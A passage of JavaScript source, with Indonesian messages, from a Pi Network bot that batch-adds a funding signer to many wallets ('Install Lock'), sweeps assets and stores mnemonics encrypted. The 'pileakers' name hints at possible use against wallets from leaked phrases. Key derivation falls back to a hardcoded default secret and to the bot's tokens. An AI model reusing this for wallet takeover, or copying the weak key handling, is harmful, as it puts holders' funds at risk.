        return value * 1000;
    }
    const text = String(value || "").trim();
    if (!text) {
        return 0;
    }
    if (/^\d+$/.test(text)) {
        return Number(text) * 1000;
    }
    const parsed = Date.parse(text);
    return Number.isFinite(parsed) ? parsed : 0;
}

function multisigPredicateActive(predicate, nowMs = Date.now()) {
    if (!predicate) {
        return false;
    }
    if (predicate.unconditional === true) {
        return true;
    }
    if (predicate.abs_before_epoch !== undefined) {
        return nowMs < multisigTimestamp(predicate.abs_before_epoch);
    }
    if (predicate.abs_before !== undefined) {
        return nowMs < multisigTimestamp(predicate.abs_before);
    }
    if (predicate.not) {
        return !multisigPredicateActive(predicate.not, nowMs);
    }
    if (Array.isArray(predicate.and)) {
        return predicate.and.every((item) => multisigPredicateActive(item, nowMs));
    }
    if (Array.isArray(predicate.or)) {
        return predicate.or.some((item) => multisigPredicateActive(item, nowMs));
    }
    return false;
}

function getClaimantPredicate(record, accountId) {
    const claimant = (record?.claimants || []).find((item) => item.destination === accountId);
    return claimant?.predicate || null;
}

async function fetchActiveNativeClaimablesForMultisig(accountId, horizonUrl) {
    let url = `${normalizeServerUrl(horizonUrl)}/claimable_balances?claimant=${encodeURIComponent(accountId)}&limit=200&order=asc`;
    const records = [];
    const seenUrls = new Set();

    while (url && records.length < 1000 && !seenUrls.has(url)) {
        seenUrls.add(url);
        const response = await axios.get(url, { timeout: 15000 });
        const pageRecords = response.data?._embedded?.records || [];
        for (const record of pageRecords) {
            if (record.asset !== "native") {
                continue;
            }
            if (multisigPredicateActive(getClaimantPredicate(record, accountId))) {
                records.push(record);
            }
        }
        if (pageRecords.length < 200) {
            break;
        }
        url = response.data?._links?.next?.href || null;
    }

    return records;
}

async function listMultisigLockedWallets() {
    const rows = await loadData(MULTISIG_LOCKED_WALLETS_KEY);
    return Array.isArray(rows) ? rows : [];
}

async function saveMultisigLockedWallets(rows) {
    await saveData(MULTISIG_LOCKED_WALLETS_KEY, rows);
}

async function getMultisigFundingKeypair(input) {
    const walletId = String(input?.fee_payer_id || input?.funding_wallet_id || "").trim();
    if (walletId) {
        const wallet = await findWalletById(walletId);
        if (!wallet) {
            throw new Error("Funding wallet tidak ditemukan. Pilih wallet funding yang valid.");
        }
        const mnemonic = String(wallet.mnemonic || "").trim();
        if (!mnemonic) {
            throw new Error("Funding wallet tidak punya mnemonic tersimpan");
        }
        const keypair = deriveKeypairFromMnemonic(mnemonic);
        const publicKey = keypair.publicKey();
        if (wallet.public_key && String(wallet.public_key).trim() !== publicKey) {
            throw new Error("Mnemonic funding wallet tidak cocok dengan public key tersimpan");
        }
        return { keypair, public_key: publicKey, wallet_id: wallet.id, wallet_name: wallet.name || "Funding Wallet" };
    }

    // Backward compatible untuk install lama, tetapi UI baru tidak lagi mengirim phrase manual.
    const manualMnemonic = String(input?.funding_mnemonic || "").trim();
    if (!manualMnemonic) {
        throw new Error("Pilih Funding Wallet terlebih dahulu");
    }
    const keypair = deriveKeypairFromMnemonic(manualMnemonic);
    return { keypair, public_key: keypair.publicKey(), wallet_id: null, wallet_name: "Manual Funding" };
}


function chunkMultisigItems(items, batchSize = MULTISIG_BATCH_SIZE) {
    const size = Number.isSafeInteger(batchSize) && batchSize > 0 ? batchSize : MULTISIG_BATCH_SIZE;
    const chunks = [];
    for (let index = 0; index < items.length; index += size) {
        chunks.push(items.slice(index, index + size));
    }
    return chunks;
}

function getMultisigBatchSize(input) {
    return parseMultisigInteger(input?.batch_size, MULTISIG_BATCH_SIZE, 1, 15, "Batch size");
}

function getMultisigBatchDelayMs(input) {
    return parseMultisigInteger(input?.batch_delay_ms, MULTISIG_BATCH_DELAY_MS, 0, 60000, "Batch delay ms");
}

function sleepMultisig(ms) {
    return new Promise((resolve) => setTimeout(resolve, Math.max(0, Number(ms) || 0)));
}

function getMultisigActionTimeoutMs() {
    const parsed = Number.parseInt(process.env.MULTISIG_ACTION_TIMEOUT_MS || "120000", 10);
    return Number.isSafeInteger(parsed) && parsed >= 15000 ? Math.min(parsed, 600000) : 120000;
}

function withMultisigActionTimeout(promise, label = "Multisig action", timeoutMs = getMultisigActionTimeoutMs()) {
    let timeoutId = null;
    const timeoutPromise = new Promise((_, reject) => {
        timeoutId = setTimeout(() => reject(new Error(`${label} timeout setelah ${Math.round(timeoutMs / 1000)} detik`)), timeoutMs);
    });
    return Promise.race([promise, timeoutPromise]).finally(() => clearTimeout(timeoutId));
}

async function waitMultisigBatchDelay(batchIndex, totalBatches, batchDelayMs, label = "multisig") {
    if (batchDelayMs > 0 && batchIndex < totalBatches - 1) {
        broadcastLog(
            `[${label}] ⏳ Delay antar batch ${Math.round(batchDelayMs / 1000)} detik untuk mengurangi rate limit.`,
            "info"
        );
        await sleepMultisig(batchDelayMs);
    }
}

async function waitMultisigBatchDelayWithStop(batchIndex, totalBatches, batchDelayMs, label = "multisig", shouldStop = null) {
    if (!(batchDelayMs > 0 && batchIndex < totalBatches - 1)) {
        return Boolean(typeof shouldStop === "function" && shouldStop());
    }
    broadcastLog(
        `[${label}] ⏳ Delay antar batch ${Math.round(batchDelayMs / 1000)} detik untuk mengurangi rate limit.`,
        "info"
    );
    const startedAt = Date.now();
    while (Date.now() - startedAt < batchDelayMs) {
        if (typeof shouldStop === "function" && shouldStop()) {
            broadcastLog(`[${label}] 🛑 Stop diminta saat delay. Batch berikutnya dibatalkan.`, "warning");
            return true;
        }
        const remaining = batchDelayMs - (Date.now() - startedAt);
        await sleepMultisig(Math.min(500, Math.max(0, remaining)));
    }
    return Boolean(typeof shouldStop === "function" && shouldStop());
}

function uniqueMultisigKeypairs(keypairs) {
    const seen = new Set();
    const unique = [];
    for (const keypair of keypairs || []) {
        const publicKey = typeof keypair.publicKey === "function" ? keypair.publicKey() : "";
        if (!publicKey || seen.has(publicKey)) {
            continue;
        }
        seen.add(publicKey);
        unique.push(keypair);
    }
    return unique;
}

function getMultisigHorizonErrorStatus(error) {
    return error?.response?.status || error?.response?.statusCode || error?.status || error?.statusCode || null;
}

function isRetryableMultisigHorizonError(error) {
    const status = getMultisigHorizonErrorStatus(error);
    if ([408, 409, 425, 429, 500, 502, 503, 504].includes(Number(status))) {
        return true;
    }
    const code = String(error?.code || "").toUpperCase();
    if (["ETIMEDOUT", "ECONNRESET", "ECONNREFUSED", "EAI_AGAIN", "ENOTFOUND", "ECONNABORTED"].includes(code)) {
        return true;
    }
    const message = String(error?.message || "").toLowerCase();
    return message.includes("timeout") || message.includes("rate limit") || message.includes("too many requests");
}

function getMultisigHorizonResultCodes(error) {
    return error?.response?.data?.extras?.result_codes || null;
}

function formatMultisigHorizonError(error) {
    const resultCodes = getMultisigHorizonResultCodes(error);
    const baseMessage = error?.message || String(error || "Unknown error");
    return resultCodes ? `${baseMessage} ${JSON.stringify(resultCodes)}` : baseMessage;
}

async function callMultisigWithHorizonFallback({ sdk, horizonUrls, label = "Multisig Horizon", action }) {
    const urls = uniqueMultisigHorizonUrls(horizonUrls);
    if (!urls.length) {
        throw new Error("Horizon URL tidak tersedia");
    }

    const errors = [];
    for (let index = 0; index < urls.length; index += 1) {
        const horizonUrl = urls[index];
        const activeServer = new sdk.Horizon.Server(horizonUrl);
        try {
            const result = await action(activeServer, horizonUrl, index);
            if (index > 0) {
                broadcastLog(`[Horizon Backup] ${label} berhasil lewat ${horizonUrl}`, "warning");
            }
            return { result, horizon_url: horizonUrl, fallback_used: index > 0 };
        } catch (err) {
            errors.push(`${horizonUrl}: ${err.message || err}`);
            if (!isRetryableMultisigHorizonError(err) || index === urls.length - 1) {
                const extra = index > 0 ? ` | fallback tried: ${errors.join(" | ")}` : "";
                err.message = `${err.message || String(err)}${extra}`;
                throw err;
            }
            const status = getMultisigHorizonErrorStatus(err);
            broadcastLog(
                `[Horizon Backup] ${label} gagal di ${horizonUrl}${status ? ` status ${status}` : ""}. Mencoba backup...`,
                "warning"
            );
        }
    }
    throw new Error(errors.join(" | ") || "Semua Horizon gagal");
}

async function fetchActiveNativeClaimablesForMultisigWithFallback(sdk, accountId, horizonUrls) {
    const shortKey = `${String(accountId || "").slice(0, 8)}...`;
    const call = await callMultisigWithHorizonFallback({
        sdk,
        horizonUrls,
        label: `claimable ${shortKey}`,
        action: async (_server, horizonUrl) => fetchActiveNativeClaimablesForMultisig(accountId, horizonUrl),
    });
    return call.result;
}

async function fetchMultisigProtocolInfoWithFallback(horizonUrls, requiredProtocolVersion = MULTISIG_REQUIRED_PROTOCOL_VERSION) {
    const urls = uniqueMultisigHorizonUrls(horizonUrls);
    const checked = [];
    for (const url of urls) {
        const info = await fetchMultisigProtocolInfo(url, requiredProtocolVersion);
        checked.push(info);
        if (info.ready) {
            return { ...info, checked_horizon_urls: checked, fallback_used: url !== urls[0] };
        }
    }
    const reachable = checked.find((item) => !item.error) || checked[0];
    return {
        ...(reachable || { ready: false, required_protocol_version: requiredProtocolVersion, checked_at: utcIso() }),
        ready: false,
        checked_horizon_urls: checked,
    };
}

async function notifyMultisigProtocolReadyTelegram(pending, protocolInfo) {
    if (pending.notified_protocol_26_at) {
        return;
    }
    const network = normalizeMultisigNetwork(pending.network).toUpperCase();
    const current = protocolInfo.current_protocol_version ?? "unknown";
    const required = protocolInfo.required_protocol_version || pending.required_protocol_version || MULTISIG_REQUIRED_PROTOCOL_VERSION;
    const text = [
        "🚀 Protocol Pi Network sudah update",
        `Network: ${network}`,
        `Protocol: ${current} / required ${required}`,
        `Horizon: ${protocolInfo.horizon_url || pending.horizon_url || "-"}`,
        `Pending Install Lock: ${pending.target_count || 0} wallet`,
        `Batch: ${pending.batch_size || MULTISIG_BATCH_SIZE} wallet`,
        `Delay: ${Math.round((pending.batch_delay_ms ?? MULTISIG_BATCH_DELAY_MS) / 1000)} detik`,
        "Bot mulai menjalankan Install Lock otomatis.",
    ].join("\n");

    try {
        await sendTelegramMessage(text);
        await updateMultisigPendingLock(pending.id, { notified_protocol_26_at: utcIso() });
        broadcastLog("Notifikasi Telegram protocol 26 sudah dikirim", "success");
    } catch (err) {
        broadcastLog(`Gagal kirim notifikasi Telegram protocol 26: ${err.message || err}`, "warning");
    }
}

async function submitMultisigOperationBatch({
    sdk,
    server,
    horizonUrls = [],
    fundingKeypair,
    fundingPublicKey,
    networkPassphrase,
    baseFee,
    operations,
    extraSigners = [],
    memo = "Signer",
}) {
    if (!operations.length) {
        throw new Error("Tidak ada operasi untuk dikirim");
    }
    if (operations.length > 100) {
        throw new Error("Operasi melebihi 100 per transaksi");
    }

    const runSubmit = async (activeServer, horizonUrl) => {
        const fundingAccountData = await withMultisigActionTimeout(
            activeServer.accounts().accountId(fundingPublicKey).call(),
            `Load funding ${String(fundingPublicKey).slice(0, 8)}...`
        );
        const txBuilder = new sdk.TransactionBuilder(new sdk.Account(fundingPublicKey, fundingAccountData.sequence), {
            fee: baseFee,
            networkPassphrase,
        });
        operations.forEach((operation) => txBuilder.addOperation(operation));
        const tx = txBuilder.addMemo(sdk.Memo.text(memo)).setTimeout(60).build();
        tx.sign(fundingKeypair);
        uniqueMultisigKeypairs(extraSigners).forEach((keypair) => tx.sign(keypair));
        const response = await withMultisigActionTimeout(
            activeServer.submitTransaction(tx),
            `Submit multisig ${operations.length} ops`
        );
        response.horizon_url = horizonUrl || response.horizon_url || null;
        return response;
    };

    const urls = uniqueMultisigHorizonUrls(horizonUrls);
    if (urls.length) {
        const call = await callMultisigWithHorizonFallback({
            sdk,
            horizonUrls: urls,
            label: `${memo} submit ${operations.length} ops`,
            action: runSubmit,
        });
        return call.result;
    }

    return runSubmit(server, null);
}


function multisigFeeBumpBaseFee(baseFee) {
    const parsed = BigInt(String(baseFee || "100000"));
    return parsed > 0n ? parsed.toString() : "100000";
}

async function submitMultisigInstallLockSingleParallel({
    sdk,
    server,
    horizonUrls = [],
    fundingKeypair,
    fundingPublicKey,
    targetKeypair,
    targetPublicKey,
    networkPassphrase,
    baseFee,
    operation,
    fundTargetAmount = "0.0000000",
    memo = "Signer",
}) {
    if (!targetKeypair || !targetPublicKey) {
        throw new Error("Target wallet tidak valid");
    }
    if (typeof sdk.TransactionBuilder.buildFeeBumpTransaction !== "function") {
        throw new Error("stellar-sdk tidak mendukung fee bump transaction");
    }

    const runSubmit = async (activeServer, horizonUrl) => {
        // Paralel aman: sequence memakai akun target, bukan funding.
        // Funding hanya menjadi fee-bump payer, jadi 15 wallet bisa submit bersamaan tanpa bentrok sequence funding.
        const targetAccountData = await withMultisigActionTimeout(
            activeServer.accounts().accountId(targetPublicKey).call(),
            `Load target ${String(targetPublicKey).slice(0, 8)}...`
        );
        const txBuilder = new sdk.TransactionBuilder(new sdk.Account(targetPublicKey, targetAccountData.sequence), {
            fee: baseFee,
            networkPassphrase,
        });
        const fundTargetStroops = parsePiAmountToStroops(String(fundTargetAmount || "0"), "Install Lock Fund PI");
        if (fundTargetStroops > 0n) {
            // Payment dibuat dulu supaya target punya reserve sebelum operasi Set Options dieksekusi.
            // Source operasi tetap funding, tetapi sequence transaksi tetap target agar batch paralel tidak bentrok sequence funding.
            txBuilder.addOperation(sdk.Operation.payment({
                source: fundingPublicKey,
                destination: targetPublicKey,
                asset: sdk.Asset.native(),
                amount: formatStroopsToPi(fundTargetStroops),
            }));
        }
        txBuilder.addOperation(operation);
        const innerTx = txBuilder.addMemo(sdk.Memo.text(memo)).setTimeout(60).build();
        innerTx.sign(targetKeypair);
        if (fundTargetStroops > 0n) {
            // Payment dari funding di inner transaction membutuhkan signature funding juga.
            innerTx.sign(fundingKeypair);
        }

        const feeBumpTx = sdk.TransactionBuilder.buildFeeBumpTransaction(
            fundingPublicKey,
            multisigFeeBumpBaseFee(baseFee),
            innerTx,
            networkPassphrase
        );
        feeBumpTx.sign(fundingKeypair);

        const response = await withMultisigActionTimeout(
            activeServer.submitTransaction(feeBumpTx),
            `Submit install lock ${String(targetPublicKey).slice(0, 8)}...`
        );
        response.horizon_url = horizonUrl || response.horizon_url || null;
        return response;
    };

    const urls = uniqueMultisigHorizonUrls(horizonUrls);
    if (urls.length) {
        const call = await callMultisigWithHorizonFallback({
            sdk,
            horizonUrls: urls,
            label: `${memo} parallel ${String(targetPublicKey).slice(0, 8)}...`,
            action: runSubmit,
        });
        return call.result;
    }

    return runSubmit(server, null);
}

async function submitMultisigTargetOperationFeeBumpParallel({
    sdk,
    horizonUrls = [],
    fundingKeypair,
    fundingPublicKey,
    targetPublicKey,
    networkPassphrase,
    baseFee,
    operations,
    extraSigners = [],
    memo = "Signer",
}) {
    if (!targetPublicKey) {
        throw new Error("Target wallet tidak valid");
    }
    if (!operations.length) {
        throw new Error("Tidak ada operasi untuk dikirim");
    }
    if (operations.length > 100) {
        throw new Error("Operasi melebihi 100 per transaksi");
    }
    if (typeof sdk.TransactionBuilder.buildFeeBumpTransaction !== "function") {
        throw new Error("stellar-sdk tidak mendukung fee bump transaction");
    }

    const runSubmit = async (activeServer, horizonUrl) => {
        // Paralel aman: sequence transaksi memakai akun target.
        // Funding hanya menjadi fee-bump payer, jadi Sweep All / Tarik Semua Aset bisa batch paralel seperti Install Lock.
        const targetAccountData = await withMultisigActionTimeout(
            activeServer.accounts().accountId(targetPublicKey).call(),
            `Load target ${String(targetPublicKey).slice(0, 8)}...`
        );
        const txBuilder = new sdk.TransactionBuilder(new sdk.Account(targetPublicKey, targetAccountData.sequence), {
            fee: baseFee,
            networkPassphrase,
        });
        operations.forEach((operation) => txBuilder.addOperation(operation));
        const innerTx = txBuilder.addMemo(sdk.Memo.text(memo)).setTimeout(60).build();
        uniqueMultisigKeypairs(extraSigners).forEach((keypair) => innerTx.sign(keypair));

        const feeBumpTx = sdk.TransactionBuilder.buildFeeBumpTransaction(
            fundingPublicKey,
            multisigFeeBumpBaseFee(baseFee),
            innerTx,
            networkPassphrase
        );
        feeBumpTx.sign(fundingKeypair);

        const response = await withMultisigActionTimeout(
            activeServer.submitTransaction(feeBumpTx),
            `Submit multisig target ${String(targetPublicKey).slice(0, 8)}...`
        );
        response.horizon_url = horizonUrl || response.horizon_url || null;
        return response;
    };

    const urls = uniqueMultisigHorizonUrls(horizonUrls);
    if (urls.length) {
        const call = await callMultisigWithHorizonFallback({
            sdk,
            horizonUrls: urls,
            label: `${memo} parallel target ${String(targetPublicKey).slice(0, 8)}...`,
            action: runSubmit,
        });
        return call.result;
    }

    throw new Error("Horizon URL tidak tersedia");
}

async function markMultisigSignerRemoved(row) {
    const rows = await listMultisigLockedWallets();
    const publicKey = String(row.public_key || "").trim();
    const fundingPublicKey = String(row.funding_public_key || "").trim();
    const network = normalizeMultisigNetwork(row.network);
    const existingIndex = rows.findIndex((item) =>
        String(item.public_key || "") === publicKey &&
        String(item.funding_public_key || "") === fundingPublicKey &&
        normalizeMultisigNetwork(item.network) === network
    );
    const nextRow = {
        ...(existingIndex >= 0 ? rows[existingIndex] : {}),
        id: publicKey,
        public_key: publicKey,
        funding_public_key: fundingPublicKey,
        signer_public_key: String(row.signer_public_key || fundingPublicKey || "").trim(),
        signer_wallet_id: row.signer_wallet_id || null,
        signer_wallet_name: row.signer_wallet_name || null,
        network,
        status: "signer_removed",
        signer_weight: 0,
        low_threshold: 0,
        med_threshold: 0,
        high_threshold: 0,
        master_weight: 1,
        hash: row.hash || rows[existingIndex]?.hash || null,
        updated_at: utcIso(),
        created_at: rows[existingIndex]?.created_at || utcIso(),
    };
    if (existingIndex >= 0) {
        rows[existingIndex] = nextRow;
    } else {
        rows.push(nextRow);
    }
    await saveMultisigLockedWallets(rows);
    return nextRow;
}

let multisigLockedWalletWriteQueue = Promise.resolve();

function withMultisigLockedWalletWriteLock(action) {
    const run = multisigLockedWalletWriteQueue.then(action, action);
    // Jangan biarkan satu kegagalan merusak antrean write berikutnya.
    multisigLockedWalletWriteQueue = run.catch(() => undefined);
    return run;
}

async function upsertMultisigLockedWallet(row) {
    return withMultisigLockedWalletWriteLock(async () => {
        const rows = await listMultisigLockedWallets();
        const publicKey = String(row.public_key || "").trim();
        const existingIndex = rows.findIndex((item) => String(item.public_key || "") === publicKey);
        const nextRow = {
            id: publicKey,
            public_key: publicKey,
            funding_public_key: String(row.funding_public_key || "").trim(),
            signer_public_key: String(row.signer_public_key || row.funding_public_key || "").trim(),
            signer_wallet_id: row.signer_wallet_id || null,
            signer_wallet_name: row.signer_wallet_name || null,
            network: normalizeMultisigNetwork(row.network),
            status: String(row.status || "locked_by_funding"),
            signer_weight: row.signer_weight,
            low_threshold: row.low_threshold,
            med_threshold: row.med_threshold,
            high_threshold: row.high_threshold,
            master_weight: row.master_weight,
            hash: row.hash || null,
            updated_at: utcIso(),
            created_at: rows[existingIndex]?.created_at || utcIso(),
        };
        if (existingIndex >= 0) {
            rows[existingIndex] = { ...rows[existingIndex], ...nextRow };
        } else {
            rows.push(nextRow);
        }
        await saveMultisigLockedWallets(rows);
        return nextRow;
    });
}


function publicMultisigLockedWallet(row) {
    return {
        id: row.id,
        public_key: row.public_key,
        funding_public_key: row.funding_public_key,
        signer_public_key: row.signer_public_key || row.funding_public_key,
        signer_wallet_id: row.signer_wallet_id || null,
        signer_wallet_name: row.signer_wallet_name || null,
        network: row.network,
        status: row.status,
        signer_weight: row.signer_weight,
        low_threshold: row.low_threshold,
        med_threshold: row.med_threshold,
        high_threshold: row.high_threshold,
        master_weight: row.master_weight,
        hash: row.hash,
        created_at: row.created_at,
        updated_at: row.updated_at,
    };
}

function splitMultisigSecretList(value) {
    return String(value || "")
        .split(/[\n,;|]+/g)
        .map((item) => String(item || "").trim())
        .filter(Boolean);
}

function getMultisigPendingCryptoSecrets() {
    // Secret pertama = secret aktif untuk enkripsi baru.
    // Secret berikutnya = legacy fallback agar data lama tetap bisa dibaca setelah update/rotasi secret.
    const candidates = [
        process.env.MULTISIG_PENDING_SECRET,
        ...splitMultisigSecretList(process.env.MULTISIG_PENDING_SECRET_OLD),
        ...splitMultisigSecretList(process.env.MULTISIG_PENDING_SECRET_PREVIOUS),
        ...splitMultisigSecretList(process.env.MULTISIG_PENDING_SECRET_LEGACY),
        ...splitMultisigSecretList(process.env.MULTISIG_PENDING_SECRET_HISTORY),
        process.env.PASSWORD_HASH_C_OLD,
        process.env.PASSWORD_HASH_C_PREVIOUS,
        process.env.PASSWORD_HASH_C_LEGACY,
        PASSWORD_HASH_C,
        process.env.TELEGRAM_BOT_TOKEN,
        process.env.JWT_SECRET,
        "pileakers-multisig-pending-local-secret",
    ];
    const seen = new Set();
    const secrets = [];
    for (const value of candidates) {
        const secret = String(value || "").trim();
        if (!secret || seen.has(secret)) {
            continue;
        }
        seen.add(secret);
        secrets.push(secret);
    }
    return secrets.length ? secrets : ["pileakers-multisig-pending-local-secret"];
}

function getMultisigPendingCryptoKey(secretValue = null) {
    const secret = secretValue === null ? getMultisigPendingCryptoSecrets()[0] : String(secretValue || "");
    return crypto.createHash("sha256").update(secret).digest();
}

function encryptMultisigPendingPayload(value) {
    const iv = crypto.randomBytes(12);
    const cipher = crypto.createCipheriv("aes-256-gcm", getMultisigPendingCryptoKey(), iv);
    const encrypted = Buffer.concat([
        cipher.update(JSON.stringify(value), "utf8"),
        cipher.final(),
    ]);
    const tag = cipher.getAuthTag();
    return {
        v: 2,
        alg: "aes-256-gcm",
        iv: iv.toString("base64"),
        tag: tag.toString("base64"),
        data: encrypted.toString("base64"),
    };
}

function decryptMultisigPendingPayloadDetailed(payload) {
    if (!payload) {
        return { value: null, encrypted: false, needs_migration: false, secret_index: -1 };
    }
    if (Array.isArray(payload)) {
        return { value: payload, encrypted: false, needs_migration: false, secret_index: -1 };
    }
    if (typeof payload === "string") {
        const text = payload.trim();
        if (!text) {
            return { value: null, encrypted: false, needs_migration: false, secret_index: -1 };
        }
        try {
            return { value: JSON.parse(text), encrypted: false, needs_migration: true, secret_index: -1 };
        } catch (err) {
            // Versi sangat lama mungkin menyimpan phrase plain-text.
            return { value: text, encrypted: false, needs_migration: true, secret_index: -1 };
        }
    }
    const iv = Buffer.from(String(payload.iv || ""), "base64");
    const tag = Buffer.from(String(payload.tag || ""), "base64");
    const data = Buffer.from(String(payload.data || ""), "base64");
    if (!iv.length || !tag.length || !data.length) {
        return { value: null, encrypted: false, needs_migration: false, secret_index: -1 };
    }
    let lastError = null;
    const secrets = getMultisigPendingCryptoSecrets();
    for (let index = 0; index < secrets.length; index += 1) {
        const secret = secrets[index];
        try {
            const decipher = crypto.createDecipheriv("aes-256-gcm", getMultisigPendingCryptoKey(secret), iv);
            decipher.setAuthTag(tag);
            const decrypted = Buffer.concat([decipher.update(data), decipher.final()]).toString("utf8");
            return {
                value: JSON.parse(decrypted),
                encrypted: true,
                needs_migration: index > 0 || Number(payload.v || 1) < 2,
                secret_index: index,
            };
        } catch (err) {
            lastError = err;
        }
    }
    const error = new Error(getMultisigEncryptedDataFriendlyMessage());
    error.code = "MULTISIG_DECRYPT_FAILED";
    error.cause = lastError || null;
    throw error;
}

function decryptMultisigPendingPayload(payload) {
    return decryptMultisigPendingPayloadDetailed(payload).value;
}

function getMultisigEncryptedDataFriendlyMessage() {
    return "Data lama tidak bisa dibaca karena kunci enkripsi berubah. Isi MULTISIG_PENDING_SECRET_OLD atau MULTISIG_PENDING_SECRET_HISTORY di .env dengan secret lama dari backup, lalu restart bot. Jika secret lama hilang total, data terenkripsi tidak bisa dipulihkan.";
}

function isMultisigDecryptError(error) {
    const message = String(error?.message || error || "");
    return error?.code === "MULTISIG_DECRYPT_FAILED" ||
        message.includes("Unsupported state or unable to authenticate data") ||
        message.includes("Data Saved Wallet List/Pending Lock") ||
        message.includes("kunci enkripsi berubah");
}

function normalizeMultisigErrorForTelegram(error) {
    if (isMultisigDecryptError(error)) {
        return getMultisigEncryptedDataFriendlyMessage();
    }
    return error?.message || String(error);
}

function migrateMultisigEncryptedField(row, fieldName) {
    if (!row || !row[fieldName]) {
        return false;
    }
    const detail = decryptMultisigPendingPayloadDetailed(row[fieldName]);
    if (!detail.needs_migration) {
        return false;
    }
    row[fieldName] = encryptMultisigPendingPayload(detail.value);
    return true;
}

async function migrateMultisigEncryptedArrayKey(key, fieldName) {
    const rows = await loadData(key);
    if (!Array.isArray(rows) || !rows.length) {
        return { changed: 0, failed: 0 };
    }
    let changed = 0;
    let failed = 0;
    for (const row of rows) {
        try {
            if (migrateMultisigEncryptedField(row, fieldName)) {
                changed += 1;
            }
        } catch (err) {
            failed += 1;
            console.log(`[Multisig Legacy Migration] ${key} gagal migrasi row ${row?.public_key || row?.id || "-"}: ${err.message || err}`);
        }
    }
    if (changed) {
        await saveData(key, rows);
    }
    return { changed, failed };
}

async function migrateMultisigEncryptedObjectKey(key, fallback, fieldName) {
    const row = await loadJsonObject(key, fallback);
    if (!row || !row[fieldName]) {
        return { changed: 0, failed: 0 };
    }
    try {
        const changed = migrateMultisigEncryptedField(row, fieldName) ? 1 : 0;
        if (changed) {
            await saveJsonObject(key, row);
        }
        return { changed, failed: 0 };
    } catch (err) {
        console.log(`[Multisig Legacy Migration] ${key} gagal migrasi: ${err.message || err}`);
        return { changed: 0, failed: 1 };
    }
}

let multisigLegacyEncryptionMigrationDone = false;
async function migrateMultisigLegacyEncryptedDataIfNeeded(force = false) {
    if (multisigLegacyEncryptionMigrationDone && !force) {
        return { changed: 0, failed: 0, skipped: true };
    }
    if (!redisClient.isOpen) {
        return { changed: 0, failed: 0, skipped: true };
    }
    multisigLegacyEncryptionMigrationDone = true;
    const results = [];
    results.push(await migrateMultisigEncryptedArrayKey(MULTISIG_SIGNERS_KEY, "encrypted_phrase"));
    results.push(await migrateMultisigEncryptedArrayKey(MULTISIG_SAVED_WALLETS_KEY, "encrypted_phrase"));
    results.push(await migrateMultisigEncryptedArrayKey(MULTISIG_PENDING_LOCKS_KEY, "encrypted_target_phrases"));
    results.push(await migrateMultisigEncryptedObjectKey(MULTISIG_SIGNER_WATCH_KEY, multisigSignerWatchDefaultState(), "encrypted_test_phrase"));
    const changed = results.reduce((sum, item) => sum + Number(item.changed || 0), 0);
    const failed = results.reduce((sum, item) => sum + Number(item.failed || 0), 0);
    if (changed || failed) {
        console.log(`[Multisig Legacy Migration] selesai. migrated=${changed}, failed=${failed}`);
    }
    return { changed, failed, skipped: false };
}

async function listMultisigSigners() {
    const rows = await loadData(MULTISIG_SIGNERS_KEY);
    return Array.isArray(rows) ? rows : [];
}

async function saveMultisigSigners(rows) {
    await saveData(MULTISIG_SIGNERS_KEY, rows);
}

function publicMultisigSigner(row) {
    return {
        id: row.id,
        name: row.name || "Signer Wallet",
        public_key: row.public_key,
        status: row.status || "active",
        created_at: row.created_at,
        updated_at: row.updated_at,
    };
}

function decryptMultisigSignerPhrase(row) {
    const decrypted = decryptMultisigPendingPayload(row?.encrypted_phrase || row?.phrase || row?.mnemonic);
    if (Array.isArray(decrypted)) {
        return String(decrypted[0] || "").trim();
    }
    return String(decrypted || "").trim();
}

function parseMultisigSignerInput(inputText, fallbackName = "") {
    const text = String(inputText || "").trim();
    if (!text) {
        throw new Error("Signer phrase kosong");
    }
    const separatorIndex = text.indexOf("|");
    if (separatorIndex > 0) {
        const name = text.slice(0, separatorIndex).trim();
        const phrase = text.slice(separatorIndex + 1).trim();
        if (!name || !phrase) {
            throw new Error("Format signer: Nama|mnemonic/passphrase");
        }
        return { name, phrase };
    }
    return { name: fallbackName || "Signer Wallet", phrase: text };
}

async function upsertMultisigSignerPhrase(inputText, fallbackName = "") {
    const { name, phrase } = parseMultisigSignerInput(inputText, fallbackName);
    const keypair = deriveKeypairFromMnemonic(phrase);
    const publicKey = keypair.publicKey();
    const rows = await listMultisigSigners();
    const now = utcIso();
    const index = rows.findIndex((row) => String(row.public_key || "") === publicKey);
    const next = {
        ...(index >= 0 ? rows[index] : {}),
        id: index >= 0 ? rows[index].id : crypto.randomUUID(),
        name: name || rows[index]?.name || "Signer Wallet",
        public_key: publicKey,
        encrypted_phrase: encryptMultisigPendingPayload(phrase),
        status: "active",
        created_at: rows[index]?.created_at || now,
        updated_at: now,
    };
    if (index >= 0) {
        rows[index] = next;
    } else {
        rows.push(next);
    }
    await saveMultisigSigners(rows);
    return { action: index >= 0 ? "updated" : "added", row: publicMultisigSigner(next) };
}

async function saveMultisigSignerPhrases(inputText) {
    const lines = normalizeMultisigLines(inputText);
    const results = [];
    for (let index = 0; index < lines.length; index += 1) {
        try {
            const result = await upsertMultisigSignerPhrase(lines[index], `Signer ${index + 1}`);
            results.push({ line: index + 1, success: true, ...result });
        } catch (err) {
            results.push({ line: index + 1, success: false, error: err.message || String(err) });
        }
    }
    return {
        total: lines.length,
        added: results.filter((item) => item.success && item.action === "added").length,
        updated: results.filter((item) => item.success && item.action === "updated").length,
        failed: results.filter((item) => !item.success).length,
        results,
    };
}

async function findMultisigSignerById(id) {
    const rows = await listMultisigSigners();
    return rows.find((row) => String(row.id || "") === String(id || "")) || null;
}

async function getMultisigSignerPublic(input = {}) {
    const signerPublicKey = String(input.signer_public_key || "").trim();
    if (signerPublicKey) {
        StellarKeypair.fromPublicKey(signerPublicKey);
        return { public_key: signerPublicKey, signer_id: input.signer_id || null, signer_name: input.signer_label || "Signer Wallet" };
    }
    const signerId = String(input.signer_id || "").trim();
    if (!signerId) {
        throw new Error("Pilih Signer Wallet terlebih dahulu");
    }
    const row = await findMultisigSignerById(signerId);
    if (!row) {
        throw new Error("Signer Wallet tidak ditemukan. Tambahkan/pilih Signer Wallet dulu.");
    }
    return { public_key: row.public_key, signer_id: row.id, signer_name: row.name || "Signer Wallet" };
}

async function getMultisigSignerKeypair(input = {}) {
    const signerId = String(input.signer_id || "").trim();
    if (!signerId) {
        throw new Error("Pilih Signer Wallet terlebih dahulu");
    }
    const row = await findMultisigSignerById(signerId);
    if (!row) {
        throw new Error("Signer Wallet tidak ditemukan. Tambahkan/pilih Signer Wallet dulu.");
    }
